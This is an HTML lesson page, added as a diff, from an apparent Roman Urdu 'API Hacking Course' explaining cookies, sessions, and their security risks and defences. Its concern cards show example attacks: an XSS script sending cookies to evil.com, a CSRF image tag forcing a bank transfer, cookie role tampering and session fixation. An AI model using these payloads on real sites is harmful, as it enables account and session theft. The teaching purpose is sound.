@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html lang="ur" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookies aur Sessions - HTTP Protocol</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            line-height: 1.8;
+            direction: ltr;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #f857a6 0%, #ff5858 100%);
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .header p {
+            font-size: 1.2em;
+            margin-top: 10px;
+        }
+
+        .breadcrumb {
+            background: #f8f9fa;
+            padding: 15px 40px;
+            border-bottom: 3px solid #f857a6;
+        }
+
+        .breadcrumb p {
+            color: #666;
+            font-size: 0.95em;
+        }
+
+        .breadcrumb span {
+            color: #f857a6;
+            font-weight: bold;
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        .intro {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .intro p {
+            font-size: 1.1em;
+            line-height: 1.8;
+            margin-bottom: 10px;
+        }
+
+        .section {
+            margin-bottom: 40px;
+        }
+
+        .section h2 {
+            color: #f857a6;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 3px solid #ff5858;
+            display: inline-block;
+        }
+
+        .section h3 {
+            color: #764ba2;
+            font-size: 1.4em;
+            margin: 25px 0 15px 0;
+            padding-left: 15px;
+            border-left: 4px solid #f857a6;
+        }
+
+        .section p {
+            color: #333;
+            margin-bottom: 15px;
+            text-align: justify;
+        }
+
+        .cookies-sessions-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin: 30px 0;
+        }
+
+        .cookies-card, .sessions-card {
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .cookies-card {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+        }
+
+        .sessions-card {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            color: white;
+        }
+
+        .cookies-card h3, .sessions-card h3 {
+            font-size: 2.2em;
+            margin: 0 0 20px 0;
+            padding: 0;
+            border: none;
+            color: white;
+            text-align: center;
+        }
+
+        .cookies-card .icon, .sessions-card .icon {
+            font-size: 4em;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .definition-box {
+            background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%);
+            border-left: 8px solid #f857a6;
+            padding: 30px;
+            margin: 30px 0;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .definition-box h3 {
+            color: #f857a6;
+            font-size: 1.6em;
+            margin: 0 0 15px 0;
+            padding: 0;
+            border: none;
+        }
+
+        .definition-box p {
+            font-size: 1.1em;
+            color: #2c3e50;
+            line-height: 1.9;
+        }
+
+        .how-it-works {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin: 25px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .how-it-works h4 {
+            color: #f857a6;
+            font-size: 1.4em;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .step-card {
+            background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .step-card .step-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #f857a6;
+            margin-bottom: 10px;
+        }
+
+        .step-card h5 {
+            color: #2c3e50;
+            font-size: 1.1em;
+            margin-bottom: 10px;
+        }
+
+        .step-card p {
+            color: #555;
+            font-size: 0.9em;
+            text-align: center;
+        }
+
+        .code-example {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95em;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+
+        .code-header {
+            background: #f857a6;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 10px 10px 0 0;
+            font-weight: bold;
+            margin-bottom: -15px;
+        }
+
+        .uses-section {
+            background: linear-gradient(135deg, #e0c3fc 0%, #8ec5fc 100%);
+            padding: 30px;
+            border-radius: 15px;
+            margin: 30px 0;
+        }
+
+        .uses-section h4 {
+            color: #667eea;
+            text-align: center;
+            margin: 0 0 25px 0;
+            font-size: 1.5em;
+        }
+
+        .uses-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+        }
+
+        .use-card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .use-card .icon {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .use-card h5 {
+            color: #667eea;
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+
+        .use-card p {
+            color: #555;
+            font-size: 0.9em;
+            text-align: left;
+        }
+
+        .security-concerns {
+            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
+            padding: 30px;
+            border-radius: 15px;
+            margin: 30px 0;
+            border-left: 8px solid #c0392b;
+        }
+
+        .security-concerns h3 {
+            color: #c0392b;
+            text-align: center;
+            margin: 0 0 25px 0;
+            padding: 0;
+            border: none;
+            font-size: 1.7em;
+        }
+
+        .concern-card {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border-left: 5px solid #c0392b;
+        }
+
+        .concern-card h4 {
+            color: #c0392b;
+            font-size: 1.4em;
+            margin-bottom: 15px;
+        }
+
+        .concern-card p {
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+
+        .concern-card .attack-example {
+            background: #2d2d2d;
+            color: #e74c3c;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            margin: 10px 0;
+        }
+
+        .comparison-table {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin: 30px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            overflow-x: auto;
+        }
+
+        .comparison-table h3 {
+            color: #f857a6;
+            text-align: center;
+            margin: 0 0 25px 0;
+            padding: 0;
+            border: none;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th {
+            background: linear-gradient(135deg, #f857a6 0%, #ff5858 100%);
+            color: white;
+            padding: 15px;
+            text-align: left;
+            font-size: 1.1em;
+        }
+
+        td {
+            padding: 12px 15px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        tr:hover {
+            background: #f8f9fa;
+        }
+
+        .highlight-box {
+            background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
+            border-left: 5px solid #f857a6;
+            padding: 25px;
+            margin: 25px 0;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .highlight-box strong {
+            color: #f857a6;
+            font-size: 1.1em;
+        }
+
+        .footer {
+            background: #2d3436;
+            color: white;
+            text-align: center;
+            padding: 30px;
+            margin-top: 40px;
+        }
+
+        .footer p {
+            color: #dfe6e9;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2em;
+            }
+
+            .content {
+                padding: 20px;
+            }
+
+            .section h2 {
+                font-size: 1.5em;
+            }
+
+            .cookies-sessions-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .steps-grid,
+            .uses-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        ul {
+            margin: 15px 0;
+            padding-left: 40px;
+        }
+
+        ul li {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .relationship-section {
+            background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%);
+            padding: 30px;
+            border-radius: 15px;
+            margin: 30px 0;
+        }
+
+        .relationship-section h3 {
+            color: #f857a6;
+            text-align: center;
+            margin: 0 0 25px 0;
+            padding: 0;
+            border: none;
+        }
+
+        .flow-diagram {
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .flow-box {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            min-width: 180px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .flow-box .icon {
+            font-size: 3em;
+            margin-bottom: 10px;
+        }
+
+        .flow-box h4 {
+            color: #f857a6;
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+
+        .flow-arrow {
+            font-size: 2em;
+            color: #f857a6;
+        }
+
+        .practical-attacks {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin: 30px 0;
+        }
+
+        .practical-attacks h2 {
+            color: white;
+            text-align: center;
+            margin: 0 0 25px 0;
+            border: none;
+            display: block;
+        }
+
+        .attack-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+        }
+
+        .attack-card {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 25px;
+            border-radius: 12px;
+            backdrop-filter: blur(10px);
+        }
+
+        .attack-card h4 {
+            color: white;
+            font-size: 1.4em;
+            margin-bottom: 15px;
+        }
+
+        .attack-card p {
+            color: #f0f0f0;
+            text-align: left;
+        }
+
+        .attack-card ul {
+            list-style: none;
+            padding: 0;
+            margin-top: 10px;
+        }
+
+        .attack-card ul li {
+            color: #f0f0f0;
+            padding: 8px 0;
+            padding-left: 25px;
+            position: relative;
+        }
+
+        .attack-card ul li::before {
+            content: "→";
+            position: absolute;
+            left: 0;
+            color: #ffd700;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🍪 Cookies aur Sessions</h1>
+            <p>State Management in HTTP</p>
+        </div>
+
+        <div class="breadcrumb">
+            <p><span>API Hacking</span> → <span>Bunyadi Maloomat</span> → <span>HTTP Protocol</span> → Cookies aur Sessions</p>
+        </div>
+
+        <div class="content">
+            <div class="intro">
+                <p>Yeh topic is baat ko samajhne ke liye <strong>bohot zaroori</strong> hai ke web applications kis tarah se <strong>state maintain</strong> karti hain aur stateless HTTP protocol par user interactions ko manage karti hain.</p>
+                
+                <p>Kyunkay <strong>HTTP stateless</strong> hai (har request azaad hai), cookies aur sessions server ke liye user ki state ko multiple requests par "yaad rakhne" ka tareeqa faraham karte hain.</p>
+            </div>
+
+            <div class="section">
+                <h2>🎯 Overview</h2>
+
+                <div class="cookies-sessions-grid">
+                    <div class="cookies-card">
+                        <div class="icon">🍪</div>
+                        <h3>Cookies</h3>
+                        <p style="margin-bottom: 20px; text-align: center;">Data ke chote tukde jo <strong>browser mein store</strong> hote hain aur har request ke saath server ko bheje jate hain.</p>
+                        <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 10px;">
+                            <p style="text-align: center; margin: 0;"><strong>Client-Side Storage</strong></p>
+                        </div>
+                    </div>
+
+                    <div class="sessions-card">
+                        <div class="icon">🔐</div>
+                        <h3>Sessions</h3>
+                        <p style="margin-bottom: 20px; text-align: center;">User aur application ke darmiyan interaction ka waqfa jo <strong>server par manage</strong> hota hai.</p>
+                        <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 10px;">
+                            <p style="text-align: center; margin: 0;"><strong>Server-Side Storage</strong></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🍪 Cookies - Tafseel</h2>
+
+                <div class="definition-box">
+                    <h3>Cookies Kya Hain?</h3>
+                    <p>Cookies data ke <strong>chote tukde</strong> hote hain jo ek server user ke web browser ko bhejta hai. Browser in cookies ko store karta hai aur har agle request ke saath dobara usi server ko wapas bhejta hai.</p>
+                    <br>
+                    <p>Inka bunyadi maqsad <strong>stateful information</strong> ko yaad rakhna ya user ki browsing activity ko record karna hota hai.</p>
+                </div>
+
+                <div class="how-it-works">
+                    <h4>🔄 Yeh Kaise Kaam Karti Hain?</h4>
+
+                    <div class="steps-grid">
+                        <div class="step-card">
+                            <div class="step-number">1</div>
+                            <h5>Server Cookie Bhejta Hai</h5>
+                            <p>HTTP response mein Set-Cookie header bhejta hai</p>
+                        </div>
+
+                        <div class="step-card">
+                            <div class="step-number">2</div>
+                            <h5>Browser Store Karta Hai</h5>
+                            <p>Browser cookie ko receive aur store karta hai</p>
+                        </div>
+
+                        <div class="step-card">
+                            <div class="step-number">3</div>
+                            <h5>Browser Bhejta Hai</h5>
+                            <p>Har agle request mein Cookie header shamil karta hai</p>
+                        </div>
+
+                        <div class="step-card">
+                            <div class="step-number">4</div>
+                            <h5>Server Receive Karta Hai</h5>
+                            <p>Server cookie ko receive aur process karta hai</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="code-header">Cookie Example</div>
+                <div class="code-example">Server Response:
+HTTP/1.1 200 OK
+Set-Cookie: sessionid=abc123; Path=/; HttpOnly; Secure
+Set-Cookie: username=ali; Domain=.example.com; Expires=Wed, 09 Jun 2025 10:18:14 GMT
+
+Client Request (Next Time):
+GET /api/profile HTTP/1.1
+Host: api.example.com
+Cookie: sessionid=abc123; username=ali</div>
+
+                <div class="uses-section">
+                    <h4>📋 Cookies Ke Aam Istemal</h4>
+                    <div class="uses-grid">
+                        <div class="use-card">
+                            <div class="icon">🔑</div>
+                            <h5>Session Management</h5>
+                            <p>Users ko website par navigate karte waqt <strong>logged-in</strong> rakhna.</p>
+                        </div>
+
+                        <div class="use-card">
+                            <div class="icon">🎨</div>
+                            <h5>Personalization</h5>
+                            <p>User ki preferences (maslan, zuban, theme settings) ko <strong>yaad rakhna</strong>.</p>
+                        </div>
+
+                        <div class="use-card">
+                            <div class="icon">📊</div>
+                            <h5>Tracking</h5>
+                            <p>Analytics ya targeted advertising ke liye user ke <strong>ravaiye ko monitor</strong> karna.</p>
+                        </div>
+
+                        <div class="use-card">
+                            <div class="icon">🛒</div>
+                            <h5>Shopping Cart</h5>
+                            <p>Cart mein items ko <strong>temporarily store</strong> karna.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="security-concerns">
+                    <h3>⚠️ Cookies Ke Security Concerns</h3>
+
+                    <div class="concern-card">
+                        <h4>1. Cross-Site Scripting (XSS)</h4>
+                        <p>Agar koi hamla karne wala (attacker) website mein malicious script inject kar sakta hai, to woh user ki <strong>cookies chura</strong> sakta hai, khaas tor par agar <code>HttpOnly</code> flag set na ho.</p>
+                        <div class="attack-example">&lt;script&gt;
+  document.location='http://evil.com/steal?cookie='+document.cookie;
+&lt;/script&gt;</div>
+                        <p><strong>Solution:</strong> HttpOnly flag set karein taake JavaScript se cookies access na hon.</p>
+                    </div>
+
+                    <div class="concern-card">
+                        <h4>2. Cross-Site Request Forgery (CSRF)</h4>
+                        <p>Cookies requests ke saath <strong>automatically</strong> bheji jaati hain, jiska faida uthaya ja sakta hai agar website CSRF protection implement na kare.</p>
+                        <div class="attack-example">&lt;img src="http://bank.com/transfer?to=attacker&amount=1000"&gt;</div>
+                        <p><strong>Solution:</strong> CSRF tokens istemal karein aur SameSite attribute set karein.</p>
+                    </div>
+
+                    <div class="concern-card">
+                        <h4>3. Insecure Transmission</h4>
+                        <p>Agar cookies <strong>unencrypted HTTP</strong> par bheji jaati hain (bina <code>Secure</code> flag ke), to unko intercept kiya ja sakta hai.</p>
+                        <div class="attack-example">HTTP/1.1 200 OK
+Set-Cookie: sessionid=abc123
+← No Secure flag! Vulnerable to interception!</div>
+                        <p><strong>Solution:</strong> Hamesha Secure flag use karein aur HTTPS enforce karein.</p>
+                    </div>
+
+                    <div class="concern-card">
+                        <h4>4. Cookie Manipulation</h4>
+                        <p>Attackers browser mein cookies ko <strong>modify</strong> kar sakte hain agar proper validation na ho.</p>
+                        <div class="attack-example">Cookie: role=user
+Modified:
+Cookie: role=admin</div>
+                        <p><strong>Solution:</strong> Server-side validation aur signed/encrypted cookies.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🔐 Sessions - Tafseel</h2>
+
+                <div class="definition-box">
+                    <h3>Sessions Kya Hain?</h3>
+                    <p>Jab ke cookies <strong>client-side</strong> (browser) par store hoti hain, sessions bunyadi tor par <strong>server-side</strong> par manage kiye jaate hain.</p>
+                    <br>
+                    <p>Session se muraad user aur web application ke darmiyan interaction ka ek <strong>waqfa</strong> hai. Kyunkay HTTP stateless hai, sessions server ke liye user ki state ko multiple requests par "yaad rakhne" ka tareeqa faraham karte hain.</p>
+                </div>
+
+                <div class="how-it-works">
+                    <h4>🔄 Yeh Kaise Kaam Karti Hain?</h4>
+
+                    <div class="steps-grid">
+                        <div class="step-card">
+                            <div class="step-number">1</div>
+                            <h5>User Login Karta Hai</h5>
+                            <p>Server unique session ID banata hai</p>
+                        </div>
+
+                        <div class="step-card">
+                            <div class="step-number">2</div>
+                            <h5>Session ID Bheji Jati Hai</h5>
+                            <p>Cookie mein session ID client ko bheji jati hai</p>
+                        </div>
+
+                        <div class="step-card">
+                            <div class="step-number">3</div>
+                            <h5>Server Data Store Karta Hai</h5>
+                            <p>Session data server par store hota hai</p>
+                        </div>
+
+                        <div class="step-card">
+                            <div class="step-number">4</div>
+                            <h5>Agli Requests</h5>
+                            <p>Session ID se data retrieve hota hai</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="code-header">Session Example</div>
+                <div class="code-example">Login Request:
+POST /api/login HTTP/1.1
+Content-Type: application/json
+
+{"username": "ali", "password": "secret123"}
+
+Server Response:
+HTTP/1.1 200 OK
+Set-Cookie: SESSIONID=xyz789; HttpOnly; Secure
+
+Server-Side Storage:
+Session ID: xyz789
+Data: {
+  "user_id": 123,
+  "username": "ali",
+  "role": "user",
+  "login_time": "2024-02-04T10:30:00Z"
+}
+
+Next Request:
+GET /api/profile HTTP/1.1
+Cookie: SESSIONID=xyz789
+← Server retrieves session data using this ID</div>
+
+                <div class="uses-section">
+                    <h4>📋 Sessions Ke Aam Istemal</h4>
+                    <div class="uses-grid">
+                        <div class="use-card">
+                            <div class="icon">✅</div>
+                            <h5>Authentication</h5>
+                            <p>User ko credentials provide karne ke baad <strong>logged in</strong> rakhna.</p>
+                        </div>
+
+                        <div class="use-card">
+                            <div class="icon">🛍️</div>
+                            <h5>Shopping Carts</h5>
+                            <p>User ke cart mein shamil kiye gaye items ko checkout se pehle <strong>store</strong> karna.</p>
+                        </div>
+
+                        <div class="use-card">
+                            <div class="icon">📝</div>
+                            <h5>User-specific Data</h5>
+                            <p>User ke mojooda interaction se mutaliq data ko <strong>temporarily store</strong> karna.</p>
+                        </div>
+
+                        <div class="use-card">
+                            <div class="icon">🔒</div>
+                            <h5>Access Control</h5>
+                            <p>User ke permissions aur roles ko <strong>track</strong> karna.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="security-concerns">
+                    <h3>⚠️ Sessions Ke Security Concerns</h3>
+
+                    <div class="concern-card">
+                        <h4>1. Session Hijacking</h4>
+                        <p>Agar koi hamla karne wala ek valid session ID haasil kar leta hai, to woh user ki <strong>naqal</strong> kar sakta hai.</p>
+                        <div class="attack-example">Methods:
+→ Cookie chori (XSS)
+→ Network sniffing (unencrypted)
+→ Session IDs ko brute-force karna
+→ Session ID prediction</div>
+                        <p><strong>Solution:</strong> HTTPS use karein, strong session IDs generate karein, HttpOnly/Secure flags set karein.</p>
+                    </div>
+
+                    <div class="concern-card">
+                        <h4>2. Session Fixation</h4>
+                        <p>Ek hamla karne wala user ko log in karne se pehle ek valid session ID faraham kar sakta hai. Agar server kamyab login ke baad naya session ID generate nahi karta, to attack successful ho jata hai.</p>
+                        <div class="attack-example">1. Attacker gets session ID: ABC123
+2. Tricks user to use this ID
+3. User logs in with ID ABC123
+4. Attacker now logged in as user!</div>
+                        <p><strong>Solution:</strong> Login ke baad hamesha naya session ID generate karein.</p>
+                    </div>
+
+                    <div class="concern-card">
+                        <h4>3. Insecure Session Storage</h4>
+                        <p>Agar server par session data ko mehfooz tareeqe se store nahi kiya jaata ya theek se invalidate nahi kiya jaata, to security issues paida hote hain.</p>
+                        <div class="attack-example">Risks:
+→ Session data exposed in logs
+→ Sessions not properly destroyed
+→ Weak session storage (files vs database)
+→ No encryption of sensitive session data</div>
+                        <p><strong>Solution:</strong> Secure storage mechanisms aur proper cleanup.</p>
+                    </div>
+
+                    <div class="concern-card">
+                        <h4>4. Session Timeout</h4>
+                        <p>Sessions ke liye munasib <strong>timeouts</strong> hone chahiye taa ke hamla karne walon ke liye mauqa kam ho.</p>
+                        <div class="attack-example">Problems:
+→ Too long: Hijacking risk increases
+→ Too short: Bad user experience
+→ No timeout: Sessions never expire!</div>
+                        <p><strong>Solution:</strong> Balance timeout (15-30 min idle) aur absolute timeout (8-12 hours).</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🔗 Cookies aur Sessions Ka Rishta</h2>
+
+                <div class="relationship-section">
+                    <h3>Kaise Sath Kaam Karte Hain?</h3>
+
+                    <div class="flow-diagram">
+                        <div class="flow-box">
+                            <div class="icon">👤</div>
+                            <h4>User</h4>
+                            <p>Login request bhejta hai</p>
+                        </div>
+
+                        <div class="flow-arrow">→</div>
+
+                        <div class="flow-box">
+                            <div class="icon">🖥️</div>
+                            <h4>Server</h4>
+                            <p>Session ID generate karta hai</p>
+                        </div>
+
+                        <div class="flow-arrow">→</div>
+
+                        <div class="flow-box">
+                            <div class="icon">🍪</div>
+                            <h4>Cookie</h4>
+                            <p>Session ID cookie mein store</p>
+                        </div>
+
+                        <div class="flow-arrow">→</div>
+
+                        <div class="flow-box">
+                            <div class="icon">💾</div>
+                            <h4>Session Store</h4>
+                            <p>Data server par store</p>
+                        </div>
+                    </div>
+
+                    <div class="highlight-box">
+                        <p><strong>💡 Key Point:</strong> Cookies typically <strong>session ID</strong> ko transport karne ke liye istemal hoti hain, jabke actual session <strong>data server par</strong> store hota hai. Yeh architecture security aur scalability improve karta hai!</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>📊 Cookies vs Sessions - Comparison</h2>
+
+                <div class="comparison-table">
+                    <h3>Quick Comparison</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Feature</th>
+                                <th>Cookies 🍪</th>
+                                <th>Sessions 🔐</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Storage Location</strong></td>
+                                <td>Client-side (Browser)</td>
+                                <td>Server-side</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Data Size</strong></td>
+                                <td>Limited (~4KB)</td>
+                                <td>Larger (server memory)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Security</strong></td>
+                                <td>Less secure (visible to user)</td>
+                                <td>More secure (server-controlled)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Expiration</strong></td>
+                                <td>Can be persistent</td>
+                                <td>Usually temporary</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Access</strong></td>
+                                <td>Client can modify</td>
+                                <td>Server-only access</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Performance</strong></td>
+                                <td>Sent with every request</td>
+                                <td>Only ID sent</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Use Case</strong></td>
+                                <td>Preferences, tracking</td>
+                                <td>Authentication, state</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🔒 API Hacking Ke Liye Ahmiyat</h2>
+
+                <div class="practical-attacks">
+                    <h2>Common Attack Vectors</h2>
+
+                    <div class="attack-grid">
+                        <div class="attack-card">
+                            <h4>🎯 Session Token Manipulation</h4>
+                            <p>"Authentication Bypass" section mein direct hamle ka rasta:</p>
+                            <ul>
+                                <li>Session IDs ko predict karna</li>
+                                <li>Weak session tokens exploit karna</li>
+                                <li>Session fixation attacks</li>
+                                <li>Token tampering</li>
+                            </ul>
+                        </div>
+
+                        <div class="attack-card">
+                            <h4>💉 Cookie Injection</h4>
+                            <p>Malicious data cookies mein inject karna:</p>
+                            <ul>
+                                <li>XSS ke through cookie theft</li>
+                                <li>Cookie poisoning</li>
+                                <li>Parameter pollution</li>
+                                <li>HTTP header injection</li>
+                            </ul>
+                        </div>
+
+                        <div class="attack-card">
+                            <h4>🚪 Privilege Escalation</h4>
+                            <p>Session/cookie data modify kar ke privileges barhana:</p>
+                            <ul>
+                                <li>Role manipulation in cookies</li>
+                                <li>Session data tampering</li>
+                                <li>Authorization bypass</li>
+                                <li>Admin access through modification</li>
+                            </ul>
+                        </div>
+
+                        <div class="attack-card">
+                            <h4>🔓 Unauthorized Access</h4>
+                            <p>Bina credentials ke sensitive data tak rasai:</p>
+                            <ul>
+                                <li>Session hijacking</li>
+                                <li>Cookie replay attacks</li>
+                                <li>Session fixation</li>
+                                <li>CSRF attacks</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🛡️ Best Practices</h2>
+
+                <div class="uses-section">
+                    <h4>Security Best Practices</h4>
+                    <div class="uses-grid">
+                        <div class="use-card">
+                            <div class="icon">🔐</div>
+                            <h5>Use HTTPS</h5>
+                            <p>Hamesha <strong>HTTPS</strong> istemal karein aur <code>Secure</code> flag set karein cookies par.</p>
+                        </div>
+
+                        <div class="use-card">
+                            <div class="icon">🚫</div>
+                            <h5>HttpOnly Flag</h5>
+                            <p><code>HttpOnly</code> flag set karein taake JavaScript se cookies access na hon.</p>
+                        </div>
+
+                        <div class="use-card">
+                            <div class="icon">🔒</div>
+                            <h5>SameSite Attribute</h5>
+                            <p><code>SameSite</code> attribute use karein CSRF protection ke liye.</p>
+                        </div>
+
+                        <div class="use-card">
+                            <div class="icon">⏰</div>
+                            <h5>Session Timeouts</h5>
+                            <p>Proper <strong>idle aur absolute timeouts</strong> set karein sessions ke liye.</p>
+                        </div>
+
+                        <div class="use-card">
+                            <div class="icon">🔄</div>
+                            <h5>Regenerate IDs</h5>
+                            <p>Login ke baad <strong>naya session ID</strong> generate karein.</p>
+                        </div>
+
+                        <div class="use-card">
+                            <div class="icon">🎲</div>
+                            <h5>Strong IDs</h5>
+                            <p><strong>Cryptographically secure</strong> random session IDs generate karein.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>📝 Mukhtasar</h2>
+
+                <div class="definition-box">
+                    <h3>Key Takeaways:</h3>
+                    <ul style="list-style: none; padding: 0;">
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #f857a6; font-weight: bold;">→</span>
+                            <strong>Cookies:</strong> Client-side storage, browser mein store, limited size
+                        </li>
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #f857a6; font-weight: bold;">→</span>
+                            <strong>Sessions:</strong> Server-side storage, session ID cookies mein transport
+                        </li>
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #f857a6; font-weight: bold;">→</span>
+                            <strong>Security Flags:</strong> HttpOnly, Secure, SameSite zaroori hain
+                        </li>
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #f857a6; font-weight: bold;">→</span>
+                            <strong>Attacks:</strong> XSS, CSRF, Session Hijacking, Fixation
+                        </li>
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #f857a6; font-weight: bold;">→</span>
+                            <strong>Best Practices:</strong> HTTPS, strong IDs, proper timeouts
+                        </li>
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #f857a6; font-weight: bold;">→</span>
+                            <strong>API Hacking:</strong> Authentication bypass, privilege escalation
+                        </li>
+                        <li style="padding: 8px 0; padding-left: 25px; position: relative;">
+                            <span style="position: absolute; left: 0; color: #f857a6; font-weight: bold;">→</span>
+                            <strong>State Management:</strong> HTTP stateless hai, cookies/sessions state maintain karte hain
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="highlight-box">
+                    <p><strong>🎯 Conclusion:</strong> Cookies aur sessions kaise kaam karte hain, isko samajhna <strong>bohot zaroori</strong> hai kyunkay inke implementation mein mojood vulnerabilities ka faida uthana authentication bypass, privilege escalation, aur ghair-ikhtiyari (unauthorized) taur par sensitive information tak rasai ka sabab ban sakta hai. Yeh API security testing ka <strong>critical component</strong> hai!</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>📚 API Hacking Course - Bunyadi Maloomat</p>
+            <p style="margin-top: 10px; font-size: 0.9em;">Cookies aur Sessions - HTTP Protocol</p>
+        </div>
+    </div>
+</body>
+</html>
